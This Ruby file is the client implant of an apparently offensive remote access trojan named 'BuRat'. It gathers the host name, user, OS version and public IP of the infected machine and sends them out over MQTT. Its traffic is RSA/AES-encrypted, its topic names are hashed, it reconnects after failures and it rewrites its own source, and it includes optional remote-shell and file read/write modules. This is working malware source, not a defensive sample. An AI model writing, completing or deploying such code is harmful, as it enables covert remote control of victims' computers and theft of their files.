require 'base64'
require 'open-uri'
require 'os'
require 'ostruct'
require 'optparse'
require 'paho-mqtt'
require 'securerandom'

require_relative 'internals/encryption'
require_relative 'internals/serialization'
require_relative 'bushido/filerw/bufilerw'
require_relative 'bushido/remoteshell/buremoteshell'

class BuRat
  attr_reader :id, :host, :os, :ip, :stauts, :internals, :bushido
  def initialize(bushido = [])
    begin
      @id = '8cba'
      @host = host()
      @os = os()
      @ip = :unknown
      @status = :offline
      @internals = {
        :optparse       => OptionParser.new,
        :mqtt           => PahoMqtt::Client.new,
        :serialization  => Internals::Serialization.new,
        :rsa            => Internals::RSA.new,
        :aes            => Internals::AES.new,
        :digest         => Internals::Digest.new
      }
      @bushido = {}
      @bushido[:remoteshell] = Bushido::BuRemoteShell.new if bushido.include? :remoteshell
      @bushido[:filerw] = Bushido::BuFileReadWrite.new if bushido.include? :filerw
      @cmd_topics = []
      @topics = {}
      @connect_thread
    rescue StandardError => error
      puts error.full_message
      initialize()
    end
  end

  def profile()
    profile = {
    	:id => @id,
    	:host => @host,
    	:os => @os,
    	:ip => ip(),
    	:status => @status,
    	:aes => {
    		:key => @internals[:aes].key,
    		:iv => @internals[:aes].iv
    	}
    }
    profile = @internals[:serialization].serialize(profile)
  	profile = @internals[:rsa].encrypt(profile)
  	profile = Base64.encode64(profile)
    return profile
  end

  def seen(data)
  	data = @internals[:serialization].serialize(data)
  	data = @internals[:aes].encrypt(data)
  	return data
  end

  def decryse(data)
  	data = @internals[:aes].decrypt(data)
  	data = @internals[:serialization].deserialize(data)
  	return OpenStruct.new(data)
  end

  def add_topic_callback(topic, &block)
    topic = @topics[topic]
    @cmd_topics.push([topic, 2])
    @internals[:mqtt].add_topic_callback(topic, block)
  end

  def publish(id, topic, payload="", retain=false, qos=0)
    topic = @topics[topic].dup
    topic['+'] = @internals[:digest].digest(id)
    #topic['+'] = id
    @internals[:mqtt].publish(topic, payload, retain, qos)
  end

  def add_topics(topics)
    topics.each do |key, value|
      if value.include?('BURAT') then
        value['BURAT'] = @id
        topics[key] = value
      end
      topics[key] = digest_topic(value)
    end
    @topics = topics
  end

  def connect()
    @status = :offline
    @connect_thread = Thread.new do
      begin
        init_mqtt()
        @internals[:mqtt].connect()
        @internals[:mqtt].subscribe(@cmd_topics)
      rescue StandardError => error
        puts error.full_message
        sleep 11
        connect()
      end
    end
  end

  def connecting?
    @connect_thread != nil && @connect_thread.status ? true : false
  end

  def ping()
    @internals[:mqtt].publish(@topics[:nil], nil, false, 2)
  end

  private
  def digest_topic(topic)
    levels = topic.split('/')
  	levels.each_with_index do |level, index|
  		if level != '+' && level != '#' then
  			levels[index] = @internals[:digest].digest(level)
  		end
  	end
  	topic = levels.join('/')
    return topic
  end

  def id()
    id = SecureRandom.hex(2)
    File.write(__FILE__, File.read(__FILE__).gsub(/@id = [i][d][(][)]/, "@id = '#{id}'"))
    return id
  end

  def host()
    OS.windows? ? `whoami`.strip : `uname -n`.strip + '\\' + `whoami`.strip
  end

  def os()
    (OS.windows? ? `ver` : `uname -sr`).strip
  end

  def ip()
    open('http://whatismyip.akamai.com').read
  end

  def init_mqtt()
    @internals[:mqtt].on_connack do
    	@status = :online
    	@internals[:mqtt].publish(@topics[:bushi], profile(), true, 2)
    end
    @internals[:mqtt].host = 'localhost'
    @internals[:mqtt].port = 1883
    @internals[:mqtt].persistent = true
    @internals[:mqtt].blocking = true
    @internals[:mqtt].will_topic = @topics[:bushi]
    @internals[:mqtt].will_payload = profile()
    @internals[:mqtt].will_qos = 2
    @internals[:mqtt].will_retain = true
  end
end
